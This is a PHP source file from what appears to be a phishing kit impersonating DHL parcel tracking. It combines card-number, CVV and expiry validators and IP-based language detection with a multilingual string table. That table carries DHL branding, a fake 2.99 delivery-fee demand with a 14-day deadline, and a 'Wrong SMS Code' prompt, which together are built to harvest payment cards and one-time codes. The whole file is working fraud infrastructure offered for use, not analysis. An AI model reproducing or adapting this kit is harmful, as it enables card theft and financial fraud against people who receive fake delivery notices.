<?php

include '../config.php';
$ip = $_SERVER['REMOTE_ADDR'];


function is_invalid_class($array, $key) {
    if( !is_array($array) )
        return false;

    if( isset($array[$key]) ) {
        $return = 'is-invalid';
        return $return;
    }
    return false;
}

function validation($array, $key) {
    if( !is_array($array) )
        return false;

    if( isset($array[$key]) ) {
        $return = '<div class="invalid-feedback">'. $array[$key] .'</div>';
        return $return;
    }
    return false;
}

function get_value($value) {
    if( isset($_SESSION[$value]) ) {
        return $_SESSION[$value];
    }
}

function get_selected_option($name,$value) {
    if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
        return 'selected';
    }
}





function validate_card($number)
 {
    global $type;
    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );
    if (preg_match($cardtype['visa'],$number)) {
        $type = "visa";
        return 'visa';
    } else if (preg_match($cardtype['mastercard'],$number)) {
        $type = "mastercard";
        return 'mastercard';
    } else if (preg_match($cardtype['amex'],$number)) {
        $type = "amex";
        return 'amex';
    } else if (preg_match($cardtype['discover'],$number)) {
        $type = "discover";
        return 'discover';
    } else {
        return false;
    }
 }
 function validate_cvv($number) {
    if (preg_match("/^[0-9]{3,4}$/",$number))
        return true;
    return false;
 }

 function validate_date($date, $format = 'Y-m-d H:i:s') {
    $d = DateTime::createFromFormat($format, $date);
    return $d && $d->format($format) == $date;
}

function validate_name($name) {
    if (!preg_match('/^[\p{L} ]+$/u', $name))
        return false;
    return true;
}
function get_client_countrycode() {
    global $countrycode;
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  $_SERVER['REMOTE_ADDR'] . ""));
    if ($details && $details->geoplugin_countryCode != null) {
        $countrycode = $details->geoplugin_countryCode;
    }
    return $countrycode;
}

function validate_email($email) {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL))
        return false;
    return true;
}
function validate_phone($phone)
{
    // Allow +, - and . in phone number
    $filtered_phone_number = filter_var($phone, FILTER_SANITIZE_NUMBER_INT);
    // Check the lenght of number
    // This can be customized if you want phone number from a specific country
    if (strlen($filtered_phone_number) != 12) {
        return false;
    } else {
        return true;
    }
}


function lang() {
    $countrycode = get_client_countrycode();
    switch ($countrycode) {
        case 'EN':
            return $_SESSION['lang'] = 'en';
            break;
        case 'FR':
            return $_SESSION['lang'] = 'fr';
            break;
        case 'ES':
            return $_SESSION['lang'] = 'es';
            break;
        case 'IT':
            return $_SESSION['lang'] = 'it';
            break;
        case 'NL':
            return $_SESSION['lang'] = 'nl';
            break;
        case 'DE':
            return $_SESSION['lang'] = 'de';
            break;
        case 'DK':
            return $_SESSION['lang'] = 'dk';
            break;
        case 'IT':
            return $_SESSION['lang'] = 'it';
            break;
        case 'IE':
            return $_SESSION['lang'] = 'ie';
            break;
        case 'SI':
            return $_SESSION['lang'] = 'si';
            break;
        default:
            return $_SESSION['lang'] = 'en';
    }
}
function get_text($place) {
    global $lang;
    return $lang[$place][$_SESSION['lang']];
};





$lang = array(

    'top_header1' => [
        'en' => 'Alert(1)',
        'de' => 'Warnung(1)',
        'es' => 'Alertas(1)',
        'fr' => 'Alerte(1)',
        'it' => 'Alert(1)',
        'nl' => 'Alert(1)',
        'ar' => 'تنبيه (1)',
        'dk' => 'Varsler(1)',
        'il' => 'התראה (1)',
        'si' => 'Opozorilo (1)',
        'ie' => 'Foláireamh(1)'
    ],

    'last_update' => [
        'en' => 'Last Updated',
        'de' => 'Zuletzt aktualisiert',
        'es' => 'Última actualización)',
        'fr' => 'Dernière mise à jour',
        'it' => 'Ultimo aggiornamento',
        'nl' => 'Laatst bijgewerkt',
        'dk' => 'Sidst opdateret',
        'il' => 'התראה ',
        'si' => 'Zadnja posodobitev',
        'ie' => 'Nuashonraithe Deiridh'
    ],

    'shipment' => [
        'en' => 'Shipment type: <b>Other</b>',
        'de' => 'Versandart: <b>Andere</b>',
        'es' => 'Tipo de envío: <b>Otro</b>',
        'fr' => 'Type d\'expédition: <b>Autre</b>',
        'it' => 'Tipo di spedizione: <b>Altro</b>',
        'nl' => 'Type zending: <b>Overige</b>',
        'dk' => 'Forsendelsestype: <b>Andet</b>',
        'il' => '',
        'si' => 'Vrsta pošiljke: <b>Drugo</b>',
        'ie' => 'Cineál lastais: <b>Eile</b>'
    ],

    'card_info' => [
        'en' => 'Card Information',
        'de' => 'Karteninformationen',
        'es' => 'Información de la tarjeta',
        'fr' => 'Informations sur la carte',
        'it' => 'Informazioni sulla carta',
        'nl' => 'Kaart informatie',
        'dk' => 'Kortoplysninger',
        'il' => 'התראה',
        'si' => 'Informacije o kartici',
        'ie' => 'Faisnéise cárta'
    ],

    'erreur_1' => [
        'en' => 'Alert(1)',
        'de' => 'Warnung(1)',
        'es' => 'Alertas(1)',
        'fr' => 'Alerte(1)',
        'it' => 'Alert(1)',
        'nl' => 'Alert(1)',
        'ar' => 'تنبيه (1)',
        'dk' => 'Varsler(1)',
        'il' => 'התראה (1)',
        'si' => 'Opozorilo (1)',
        'ie' => 'Foláireamh(1)'
    ],


    'top_header2' => [
        'en' => 'Contact Us',
        'de' => 'Kontakt',
        'es' => 'Contáctanos',
        'fr' => 'Nous contacter',
        'it' => 'Contattaci',
        'nl' => 'Contact Opnemen',
        'ar' => 'اتصل بنا',
        'dk' => 'Kontakt oss',
        'il' => 'צור קשר',
        'si' => 'Kontaktiraj nas',
        'ie' => 'Glaoigh orainn'
    ],

    'top_header3' => [
        'en' => 'English',
        'de' => 'Deutschland',
        'es' => 'España',
        'fr' => 'France',
        'it' => 'Italia',
        'nl' => 'Nederland',
        'ar' => 'العربية',
        'dk' => 'Norge',
        'il' => 'ארצות הברית',
        'si' => 'slovène',
        'ie' => 'Irlande'
    ],

    'top_header4' => [
        'en' => 'Search',
        'de' => 'Suche',
        'es' => 'Buscar',
        'fr' => 'Recherche',
        'it' => 'Cerca',
        'nl' => 'Zoeken',
        'ar' => 'ابحث',
        'dk' => 'Søk',
        'il' => 'לחפש',
        'si' => 'Iskanje',
        'ie' => 'Cuardach'
    ],

    'mainmenu1' => [
        'en' => 'Track',
        'de' => 'Verfolgen Sie',
        'es' => 'Rastrear',
        'fr' => 'Suivi',
        'it' => 'Tracciamento',
        'nl' => 'Traceren',
        'ar' => 'كود التتبع',
        'dk' => 'Sporing',
        'il' => 'מַסלוּל',
        'si' => 'Track',
        'ie' => 'Rian'
    ],
    
    'sms_err' => [
        'en' => 'Wrong SMS Code',
        'de' => 'Falscher SMS-Code',
        'es' => 'Código SMS incorrecto',
        'fr' => 'Code SMS incorrect',
        'it' => 'Codice SMS errato',
        'nl' => 'Verkeerde sms-code',
        'ar' => 'رمز التحقق الخاص بك غير صحيح',
        'dk' => 'Forkert SMS-kode',
        'il' => 'קוד SMS שגוי',
        'si' => 'Track',
        'ie' => 'Napačna SMS koda'
    ]
    
    
    
    ,

    'mainmenu2' => [
        'en' => 'Ship',
        'de' => 'Versenden',
        'es' => 'Envío',
        'fr' => 'Envoyer',
        'it' => 'Spedizione',
        'nl' => 'Versturen',
        'dk' => 'Send',
        'il' => 'ספינה',
        'si' => 'Ladja',
        'ie' => 'Long'
    ],

    'mainmenu3' => [
        'en' => 'Logistics Solutions',
        'de' => 'Logistik-Lösungen',
        'es' => 'Soluciones de Logística',
        'fr' => 'Solutions logistiques',
        'it' => 'Soluzioni di Logistica',
        'nl' => 'Logistieke oplossingen',
        'ar' => 'الحلول اللوجستية',
        'dk' => 'Logistikkløsninger',
        'il' => 'פתרונות לוגיסטיים',
        'si' => 'Logistične rešitve',
        'ie' => 'Réitigh Loighistic'

    ],

    'mainmenu4' => [
        'en' => 'Customer Service',
        'de' => 'Kundenbetreuung',
        'es' => 'Servicio al cliente',
        'fr' => 'Service client',
        'it' => 'Servizio Clienti',
        'nl' => 'Klantenservice',
        'ar' => 'خدمة العملاء',
        'dk' => 'Kundeservice',
        'il' => 'שירות לקוחות',
        'si' => 'Storitev za stranke',
        'ie' => 'Seirbhís do chustaiméirí'

    ],

    'header-right' => [
        'en' => 'Customer Portal Logins',
        'de' => 'Kundenportal-Login',
        'es' => 'Portal de inicio de sesión del cliente',
        'fr' => 'Connexion au portail client',
        'it' => 'Login Portale Clienti',
        'nl' => 'Aanmelden klantenportaal',
        'ar' => 'تسجيل الدخول',
        'dk' => 'Pålogging til kundeportal',
        'il' => 'כניסות לפורטל לקוחות',
        'si' => 'Prijave na portal za stranke',
        'ie' => 'Logins Tairseach do Chustaiméirí'
    ],

    'footer-widget-1-header' => [
        'en' => 'Help Center',
        'de' => 'Hilfe-Center',
        'es' => 'Centro de Ayuda',
        'fr' => 'Centre d’assistance',
        'it' => 'Centro Assistenza',
        'nl' => 'Support',
        'ar' => 'مركز المساعدة',
        'dk' => 'Hjelpesenter',
        'il' => 'מרכז עזרה',
        'si' => 'Center pomoči',
        'ie' => 'Ionad Cabhrach'

    ],

    'footer-widget-2-header' => [
        'en' => 'Our Divisions',
        'de' => 'Unsere Geschäftsbereiche',
        'es' => 'Nuestras divisiones',
        'fr' => 'Nos divisions',
        'it' => 'Le Nostre Divisioni',
        'nl' => 'Onze Divisies',
        'ar' => 'أقسامنا',
        'dk' => 'Våre avdelinger',
        'il' => 'החטיבות שלנו',
        'si' => 'Naše divizije',
        'ie' => 'Ár Rannáin'

    ],

    'footer-widget-3-header' => [
        'en' => 'Industry Sectors',
        'de' => 'Industriezweige',
        'es' => 'Sectores de la Industria',
        'fr' => 'Secteurs d\'industries',
        'it' => 'Settori Industriali',
        'nl' => 'Industriële sectoren',
        'ar' => 'قطاعات الصناعة',
        'dk' => 'Bransjesektorer',
        'il' => 'מגזרי תעשייה',
        'si' => 'Industrijski sektorji',
        'ie' => 'Earnálacha Tionscail'

    ],

    'footer-widget-4-header' => [
        'en' => 'Company Information',
        'de' => 'Informationen zum Unternehmen',
        'es' => 'Información de la empresa',
        'fr' => 'Informations sur l\'entreprise',
        'it' => 'Informazioni sull\'Azienda',
        'nl' => 'Bedrijfsinformatie',
        'ar' => 'معلومات الشركة',
        'dk' => 'Bedriftsinformasjon',
        'il' => 'מידע על החברה',
        'si' => 'Informacije o podjetju',
        'ie' => 'Eolas Cuideachta'

    ],

    'footer-widget-1-1' => [
        'en' => 'Customer Service',
        'de' => 'Kundenbetreuung',
        'es' => 'Servicio al Cliente',
        'fr' => 'Service clientèle',
        'it' => 'Servizio Clienti',
        'nl' => 'Klantenservice',
        'ar' => 'خدمة العملاء',
        'dk' => 'Kundeservice',
        'il' => 'שירות לקוחות',
        'si' => 'Storitev za stranke',
        'ie' => 'Seirbhís do chustaiméirí'
    ],

    'footer-widget-1-2' => [
        'en' => 'Customer Portal Logins',
        'de' => 'Kundenportal-Logins',
        'es' => 'Portal de inicio de sesión del cliente',
        'fr' => 'Connexion au portail client',
        'it' => 'Login Portale Clienti',
        'nl' => 'Aanmelden klantportaal',
        'ar' => 'تسجيل الدخول',
        'dk' => 'Pålogging til kundeportal',
        'il' => 'כניסות לפורטל לקוחות',
        'si' => 'Prijave na portal za stranke',
        'ie' => 'Logins Tairseach do Chustaiméirí'
    ],

    'footer-widget-1-3' => [
        'en' => 'Digital Partners and Integrations',
        'de' => 'Digitale Vertriebspartner und Integrationsprojekte',
        'es' => 'Socios digitales e integraciones',
        'fr' => 'Partenaires numériques et intégrations',
        'it' => 'Partner Digitali e Integrazioni',
        'nl' => 'Digitale partners en integraties',
        'ar' => 'التكامل والشركاء الرقميين',
        'dk' => 'Digitale partnere og integrering',
        'il' => 'שותפים דיגיטליים ואינטגרציות',
        'si' => 'Digitalni partnerji in integracije',
        'ie' => 'Comhpháirtithe Digiteacha agus Comhtháthaithe'
    ],

    'footer-widget-1-4' => [
        'en' => 'Developer Portal',
        'de' => 'Entwickler-Portal',
        'es' => 'Portal del desarollador',
        'fr' => 'Portail des développeurs',
        'it' => 'Portale Sviluppatori',
        'nl' => 'Ontwikkelaarsportaal',
        'ar' => 'بوابة المطور',
        'dk' => 'Utviklerportal',
        'il' => 'פורטל מפתחים',
        'si' => 'Portal za razvijalce',
        'ie' => 'Tairseach Forbróra'
    ],

    'footer-widget-2-1' => [
        'en' => 'Post and Paket Deutschland',
        'de' => 'Post und Paket Deutschland',
        'es' => 'Post and Paket Deutschland',
        'fr' => 'Post and Paket Deutschland',
        'it' => 'Post e Paket Deutschland',
        'nl' => 'Post and Paket Deutschland',
        'il' => 'דואר וחבילה גרמניה',
        'dk' => 'Post and Paket Denmark',
        'si' => 'Pošta in Paket Deutschland',
        'ie' => 'Post agus Paicéad Deutschland'

    ],

    'footer-widget-2-2' => [
        'en' => 'DHL Express',
        'de' => 'DHL Express',
        'es' => 'DHL Express',
        'fr' => 'DHL Express',
        'it' => 'DHL Express',
        'nl' => 'DHL Express',
        'dk' => 'DHL Express',
        'il' => 'DHL Express',
        'si' => 'DHL Express',
        'ie' => 'DHL Express'

    ],

    'footer-widget-2-3' => [
        'en' => 'DHL Global Forwarding',
        'de' => 'DHL Globaler Versand',
        'es' => 'DHL Global Forwarding',
        'fr' => 'DHL Global Forwarding',
        'it' => 'DHL Global Forwarding',
        'nl' => 'DHL Global Forwarding',
        'ar' => 'دي إتش إل إكسبرس',
        'dk' => 'DHL Global Forwarding',
        'il' => 'שילוח גלובלי של DHL',
        'si' => 'DHL Global Forwarding',
        'ie' => 'Cur ar Aghaidh Domhanda DHL'

    ],

    'footer-widget-2-4' => [
        'en' => 'DHL Freight',
        'de' => 'DHL Fracht',
        'es' => 'DHL Freight',
        'fr' => 'DHL Freight',
        'it' => 'DHL Freight',
        'nl' => 'DHL Freight',
        'ar' => 'DHL للشحن',
        'dk' => 'DHL Freight',
        'il' => 'DHL Freight',
        'si' => 'DHL Freight',
        'ie' => 'Lastais DHL'

    ],

    'footer-widget-2-5' => [
        'en' => 'DHL Supply Chain',
        'de' => 'DHL Lieferkette',
        'es' => 'DHL Supply Chain',
        'fr' => 'DHL Supply Chain',
        'it' => 'DHL Supply Chain',
        'nl' => 'DHL Supply Chain',
        'ar' => 'سلسلة التوريد DHL',
        'dk' => 'DHL Supply Chain',
        'il' => 'שרשרת אספקה של DHL',
        'si' => 'DHL dobavna veriga',
        'ie' => 'Slabhra Soláthair DHL'

    ],

    'footer-widget-2-6' => [
        'en' => 'DHL eCommerce',
        'de' => 'DHL eCommerce',
        'es' => 'DHL eCommerce',
        'fr' => 'DHL eCommerce',
        'it' => 'DHL eCommerce',
        'nl' => 'DHL Parcel',
        'dk' => 'DHL Parcel',
        'il' => 'מסחר אלקטרוני של DHL',
        'si' => 'DHL e-trgovina',
        'ie' => 'Ríomhthráchtáil DHL'

    ],

    'footer-widget-3-1' => [
        'en' => 'Auto-Mobility',
        'de' => 'Auto-Mobilität',
        'es' => 'Movilidad autónoma',
        'fr' => 'Auto-Mobilité',
        'it' => 'Auto-Mobilità',
        'nl' => 'Automotive',
        'dk' => 'Auto-Mobility',
        'il' => 'ניידות אוטומטית',
        'si' => 'Avtomobilnost',
        'ie' => 'Gluaiseacht Auto'

    ],

    'footer-widget-3-2' => [
        'en' => 'Chemicals',
        'de' => 'Chemie',
        'es' => 'Productos químicos',
        'fr' => 'Produits chimiques',
        'it' => 'Prodotti Chimici',
        'nl' => 'Chemische industrie',
        'dk' => 'Kjemikalier',
        'il' => 'כימיקלים',
        'si' => 'Kemikalije',
        'ie' => 'Ceimiceáin'

    ],

    'footer-widget-3-3' => [
        'en' => 'Consumer',
        'de' => 'Verbraucher',
        'es' => 'Consumidor',
        'fr' => 'Consommateurs',
        'it' => 'Consumatore',
        'nl' => 'Consument',
        'dk' => 'Forbruker',
        'il' => 'צרכן',
        'si' => 'Potrošnik',
        'ie' => 'Tomhaltóir' 

    ],

    'footer-widget-3-4' => [
        'en' => 'Energy',
        'de' => 'Energie',
        'es' => 'Energía',
        'fr' => 'Energie',
        'it' => 'Energia',
        'nl' => 'Energie',
        'dk' => 'Energi',
        'il' => 'אֵנֶרְגִיָה',
        'si' => 'Energy',
        'ie' => 'Fuinneamh'

    ],

    'footer-widget-3-5' => [
        'en' => 'Engineering and Manufacturing',
        'de' => 'Maschinenbau und Fertigung',
        'es' => 'Ingeniería y manufactura',
        'fr' => 'Ingénierie et fabrication',
        'it' => 'Ingegneria e Produzione',
        'nl' => 'Engineering en productie',
        'dk' => 'Utvikling og produksjon',
        'il' => 'הנדסה וייצור',
        'si' => 'Inženiring in proizvodnja',
        'ie' => 'Innealtóireacht agus Déantúsaíocht'
    ],

    'footer-widget-3-6' => [
        'en' => 'Life Sciences and Healthcare',
        'de' => 'Life Sciences und Gesundheitswesen',
        'es' => 'Ciencias biológicos y sector de la salud',
        'fr' => 'Sciences de la vie et soins de santé',
        'it' => 'Scienze della Vita e Sanità',
        'nl' => 'Life Sciences en gezondheidszorg',
        'dk' => 'Livsvitenskap og helse',
        'il' => 'מדעי החיים ושירותי הבריאות',
        'si' => 'Znanosti o življenju in zdravstvo',
        'ie' => 'Eolaíochtaí Beatha agus Cúram Sláinte'
    ],

    'footer-widget-3-7' => [
        'en' => 'Public Sector',
        'de' => 'Öffentlicher Sektor',
        'es' => 'Sector Público',
        'fr' => 'Secteur public',
        'it' => 'Settore Pubblico',
        'nl' => 'Publieke sector',
        'dk' => 'Offentlig sektor',
        'il' => 'מגזר ציבורי',
        'si' => 'Javni sektor',
        'ie' => 'Earnáil Phoiblí'
    ],

    'footer-widget-3-8' => [
        'en' => 'Retail',
        'de' => 'Einzelhandel',
        'es' => 'Retail',
        'fr' => 'Commerce de détail',
        'it' => 'Retail',
        'nl' => 'Detailhandel',
        'dk' => 'Detaljhandel',
        'il' => 'קמעונאות',
        'si' => 'Maloprodaja',
        'ie' => 'Miondíola'
    ],

    'footer-widget-3-9' => [
        'en' => 'Technology',
        'de' => 'Technologie',
        'es' => 'Tecnología',
        'fr' => 'Technologie',
        'it' => 'Tecnologia',
        'nl' => 'Technologie',
        'dk' => 'Teknologi',
        'il' => 'טֶכנוֹלוֹגִיָה',
        'si' =>  'tehnologija',
        'ie' => 'Teicneolaíocht'
    ],

    'footer-widget-4-1' => [
        'en' => 'About DHL',
        'de' => 'Über DHL',
        'es' => 'Acerca de DHL',
        'fr' => 'A propos de DHL',
        'it' => 'Informazioni su DHL',
        'nl' => 'Over DHL',
        'dk' => 'Om DHL',
        'il' => 'לגבי DHL',
        'si' =>  'O DHL-u',
        'ie' => 'Maidir le DHL'
    ],

    'footer-widget-4-2' => [
        'en' => 'Careers',
        'de' => 'Karriere',
        'es' => 'Carreras',
        'fr' => 'Carrières',
        'it' => 'Lavora con Noi',
        'nl' => 'Spotlight Stories',
        'dk' => 'Karriere',
        'il' => 'קריירה',
        'si' =>  'Kariere',
        'ie' => 'Gairmeacha'
    ],

    'footer-widget-4-3' => [
        'en' => 'Press Center',
        'de' => 'Presse-Center',
        'es' => 'Centro de Prensa',
        'fr' => 'Centre de presse',
        'it' => 'Centro Stampa',
        'nl' => 'Werken bij DHL',
        'dk' => 'Pressesenter',
        'il' => 'מרכז תקשורתי',
        'si' => 'Tiskovno središče',
        'ie' => 'Ionad Preasa'
    ],

    'footer-widget-4-4' => [
        'en' => 'Sustainability',
        'de' => 'Nachhaltigkeit',
        'es' => 'Sustentabilidad',
        'fr' => 'Développement durable',
        'it' => 'Sostenibilità',
        'nl' => 'Perscentrum',
        'dk' => 'Bærekraft',
        'il' => 'קיימות',
        'si' => 'Trajnost',
        'ie' => 'Inbhuanaitheacht'
    ],

    'footer-widget-4-5' => [
        'en' => 'Insights and Innovation',
        'de' => 'Einblicke und Innovationen',
        'es' => 'Ideas e innovación',
        'fr' => 'Perspectives et innovation',
        'it' => 'Approfondimenti e Innovazione',
        'nl' => 'Duurzaamheid',
        'dk' => 'Innsikt og innovasjon',
        'il' => 'תובנות וחדשנות',
        'si' => 'Spoznanja in inovacije',
        'ie' => 'Léargais agus Nuálaíocht'
    ],

    'footer-widget-4-6' => [
        'en' => 'Official Logistics Partners',
        'de' => 'Offizielle Logistik-Partner',
        'es' => 'Socios oficiales de logística',
        'fr' => 'Partenaires logistiques officiels',
        'it' => 'Partner Ufficiali di Logistica',
        'nl' => 'Inzichten en innovatie',
        'dk' => 'Offisiell logistikkpartner',
        'il' => 'שותפים לוגיסטיים רשמיים',
        'si' => 'Uradni logistični partnerji',
        'ie' => 'Comhpháirtithe Lóistíochta Oifigiúla'
    ],

    'follow-us' => [
        'en' => 'Follow Us',
        'de' => 'Folgen Sie uns',
        'es' => 'Síganos',
        'fr' => 'Suivez-nous',
        'it' => 'Seguici',
        'nl' => 'Volg ons',
        'dk' => 'Følg oss',
        'il' => 'עקוב אחרינו',
        'si' => 'Sledi nam',
        'ie' => 'Lean orainn'
    ],

    'footer-menu-1' => [
        'en' => 'Fraud Awareness',
        'de' => 'Betrugserkennung',
        'es' => 'Conciencia sobre fraudes',
        'fr' => 'Sensibilisation à la fraude',
        'it' => 'Nota Legale',
        'nl' => 'Fraudebewustzijn',
        'dk' => 'Bevissthet om svindel',
        'il' => 'מודעות להונאה',
        'si' => 'Zavedanje goljufij',
        'ie' => 'Feasacht Calaoise'
    ],

    'footer-menu-2' => [
        'en' => 'Legal Notice',
        'de' => 'Rechtliche Hinweise',
        'es' => 'Aviso Legal',
        'fr' => 'Avis juridique',
        'it' => 'Termini e Condizioni d\'Uso',
        'nl' => 'Juridische kennisgeving',
        'dk' => 'Juridisk erklæring',
        'il' => 'הודעה משפטית',
        'si' => 'Pravno obvestilo',
        'ie' => 'Fógra Dlíthiúil'
    ],

    'footer-menu-3' => [
        'en' => 'Terms of Use',
        'de' => 'Nutzungsbedingungen',
        'es' => 'Condiciones de Uso',
        'fr' => 'Conditions d\'utilisation',
        'it' => 'Nota sulla Privacy',
        'nl' => 'Gebruiksvoorwaarden',
        'dk' => 'Bruksvilkår',
        'il' => 'תנאי שימוש',
        'si' => 'Pogoji uporabe',
        'ie' => 'Téarmaí Úsáide'
    ],

    'footer-menu-4' => [
        'en' => 'Privacy Notice',
        'de' => 'Hinweis zum Datenschutz',
        'es' => 'Aviso de Privacidad',
        'fr' => 'Avis de confidentialité',
        'it' => 'Risoluzione Controversie',
        'nl' => 'Privacyverklaring',
        'dk' => 'Personvernerklæring',
        'il' => 'הודעת פרטיות',
        'si' => 'Obvestilo o zasebnosti',
        'ie' => 'Fógra Príobháideachta'
    ],

    'footer-menu-5' => [
        'en' => 'Dispute Resolution',
        'de' => 'Konfliktlösung',
        'es' => 'Resolución de disputas',
        'fr' => 'Résolution des litiges',
        'it' => 'Accessibilità',
        'nl' => 'Geschillenbeslechting',
        'dk' => 'Konflikthåndtering',
        'il' => 'יישוב סכסוכים',
        'si' => 'Reševanje sporov',
        'ie' => 'Réiteach Díospóide'
    ],

    'footer-menu-6' => [
        'en' => 'Accessibility',
        'de' => 'Erreichbarkeit',
        'es' => 'Accesibilidad',
        'fr' => 'Accessibilité',
        'it' => 'Informazioni Aggiuntive',
        'nl' => 'Toegankelijkheid',
        'dk' => 'Tilgjengelighet',
        'il' => 'נְגִישׁוּת',
        'si' => 'Dostopnost',
        'ie' => 'Inrochtaineacht'
    ],

    'footer-menu-7' => [
        'en' => 'Additional Information',
        'de' => 'Zusätzliche Informationen',
        'es' => 'Información adicional',
        'fr' => 'Informations complémentaires',
        'it' => 'Impostazioni dei Cookie',
        'nl' => 'Aanvullende informatie',
        'dk' => 'Tilleggsinformasjon',
        'il' => 'מידע נוסף',
        'si' => 'Dodatne informacije',
        'ie' => 'eolas breise'
    ],

    'footer-menu-8' => [
        'en' => 'Cookies Settings',
        'de' => 'Cookies Einstellungen',
        'es' => 'Configuración de cookies',
        'fr' => 'Paramètres des cookies',
        'it' => 'Impostazioni dei cookie',
        'nl' => 'Cookie-instellingen',
        'dk' => 'Informasjonskapselinnstillinger',
        'il' => 'הגדרות עוגיות',
        'si' => 'Nastavitve piškotkov',
        'ie' => 'Socruithe Fianáin'
    ], 

    'copyright' => [
        'en' => '2023 © DHL International GmbH. All rights reserved',
        'de' => '2023 DHL GmbH. Alle Rechte vorbehalten.',
        'es' => '2023 DHL GmbH. Todos los derechos reservados.',
        'fr' => '2023 DHL GmbH. Tous droits réservés.',
        'it' => '2023 DHL GmbH. Tutti i diritti riservati.',
        'nl' => '2023 DHL GmbH. Alle rechten voorbehouden.',
        'dk' => '2023 © DHL International GmbH. Alle rettigheter forbeholdt.',
        'il' => '2023 © DHL International GmbH. כל הזכויות שמורות',
        'si' => '2023 © DHL International GmbH. Vse pravice pridržane',
        'ie' => '2023 © DHL International GmbH. Gach ceart ar cosaint'
    ],

    'title' => [
        'en' => 'DHL TRACKING',
        'de' => 'DHL Sendungsverfolgung',
        'es' => 'Rastreo de DHL',
        'fr' => 'Suivi des envois DHL',
        'it' => 'Tracking DHL',
        'nl' => 'DHL Traceren',
        'dk' => 'DHL-SPORING',
        'il' => 'DHL מעקב',
        'si' => 'DHL SLEDENJE',
        'ie' => 'RIANÚ DHL'
    ],

    'title2' => [
        'en' => 'Shipment in delivering',
        'de' => 'Sendung in Zustellung',
        'es' => 'Envío en transito',
        'fr' => 'Envoi en cours de livraison',
        'it' => 'Spedizione in consegna',
        'nl' => 'Shipment in delivering',
        'dk' => 'Forsendelse i levering',
        'il' => 'משלוח במשלוח',
        'si' => 'Pošiljka v dostavi',
        'ie' => 'Loingsiú i seachadadh'
    ],

    'status' => [
        'en' => 'Status: <b>in delivering</b>',
        'de' => 'Status: <b>in Zustellung</b>',
        'es' => 'Estado:  <b>En camino</b>',
        'fr' => 'Statut : <b>en cours de livraison</b>',
        'it' => 'Stato: <b>in consegna</b>',
        'nl' => 'Status: <b>in delivering</b>',
        'dk' => 'Status: <b>i levering</b>',
        'il' => 'סטָטוּס: <b>במסירה</b>',
        'si' => 'Stanje: <b>v dostavi</b>',
        'ie' => 'Stádas: <b>i seachadadh</b>'
    ],

    'total' => [
        'en' => 'Total : <b>2.99$</b>',
        'de' => 'Total: <b>2.99 € </b>',
        'es' => 'Total:  <b>2.99 € </b>',
        'fr' => 'Total : <b>2.99€</b>',
        'it' => 'Stato: <b>2.99 € </b>',
        'nl' => 'total: <b>2.99$</b>',
        'dk' => 'total: <b>2.99$</b>',
        'il' => 'Total <b>2.99 ILS</b>',
        'si' => 'Skupaj <b>2,99 SIT</b>',
        'ie' => 'Tosdsdtal : <b>2.99£</b>'
    ],

    'parcel' => [
        'en' => 'This shipment is handled by: <b>DHL Parcel</b>',
        'de' => 'Diese Sendung wird abgewickelt <b>von: DHL-Paket</b>',
        'es' => 'Este envío es manejado por: <b>DHL Parcel</b>',
        'fr' => 'Cet envoi est géré par : <b>DHL Parcel</b>',
        'it' => 'Questa spedizione è gestita da: <b>Corriere DHL</b>',
        'nl' => 'De zending wordt verwerkt door: <b>DHL Parcel</b>',
        'dk' => 'Denne forsendelsen håndteres av: <b>DHL Parcel</b>',
        'il' => 'משלוח זה מטופל על ידי: <b>חבילת DHL</b>',
        'si' => 'To pošiljko obravnava: <b>DHL Parcel</b>',
        'ie' => 'Déantar an lastas seo a láimhseáil ag: <b>DHL Beartán</b>'
    ],

    'tracking' => [
        'en' => 'Tracking Code: CS47*********',
        'de' => 'Sendungsverfolgungsnummer: CS47*********',
        'es' => 'Código de Rastreo: CS47*********',
        'fr' => 'Code de suivi : CS47*********',
        'it' => 'Codice Tracking: CS47*********',
        'nl' => 'Traceringsnummer: CS47**********',
        'dk' => 'Sporingskode: CS47**********',
        'il' => 'קוד מעקב: CS47**********',
        'si' => 'Koda za sledenje: CS47*********',
        'ie' => 'Cód Rianaithe: CS47*****'
    ],

    'important_title' => [
        'en' => 'Important Message!',
        'de' => 'Wichtige Nachricht!',
        'es' => '¡Mensaje Importante!',
        'fr' => 'Message important !',
        'it' => 'Messaggio Importante!',
        'nl' => 'Belangrijke boodschap!',
        'dk' => 'Viktig melding!',
        'il' => 'הודעה חשובה!',
        'si' => 'Pomembno sporočilo!',
        'ie' => 'Teachtaireacht Tábhachtach!'
    ],

    'important_message' => [
        'en' => 'To complete the delivery as soon as possible, Please confirm the payment (2.99) by clicking next. Online confirmation must be made within the next 14 days, before it expires.',
        'de' => 'Um die Lieferung so schnell wie möglich abzuschließen, bestätigen Sie bitte die Zahlung (2,99) durch Klicken auf Weiter. Die Online-Bestätigung muss innerhalb der nächsten 14 Tage erfolgen, bevor sie abläuft.',
        'es' => 'Para completar el envío lo más pronto posible, por favor confirme el pago (2.99) haciendo clic en Siguiente. Se necesita hacer la confirmación en Línea dentro de los siguientes 14 días, antes de que expire.',
        'fr' => '"Pour effectuer la livraison dans les meilleurs délais, veuillez confirmer le paiement (2,99) en cliquant sur suivant. 
paiement (1.99) en cliquant sur suivant. La confirmation en ligne doit être effectuée 
dans les 14 prochains jours, avant qu\'elle n\'expire."',
        'it' => '"Per completare la consegna il prima possibile, conferma il pagamento (2,99) cliccando su avanti. La conferma online deve essere effettuata 
entro i prossimi 14 giorni, prima che scada."',
        'nl' => 'Bevestig de betaling (2,99) door op next te klikken om de verzending zo snel mogelijk te voltooien. Er moet binnen 14 dagen online worden bevestigd, voordat het verloopt.',
        'dk' => 'For å fullføre leveransen så snart som mulig, bekreft betalingen (2,99) ved å klikke på neste. Online bekreftelse må gjøres innen de neste 14 dagene, før den utløper.',
        'il' => 'כ2י להשלים את המשלוח בהקדם האפשרי, אנא אשר את התשלום (1.99) על ידי לחיצה על הבא. יש לבצע אישור מקוון בתוך 14 הימים הבאים, לפני שתוקפו יפוג.',
        'si' => 'Za čimprejšnjo izvedbo dostave potrdite plačilo (2,99) s klikom naprej. Spletna potrditev mora biti opravljena v naslednjih 14 dneh, preden poteče.',
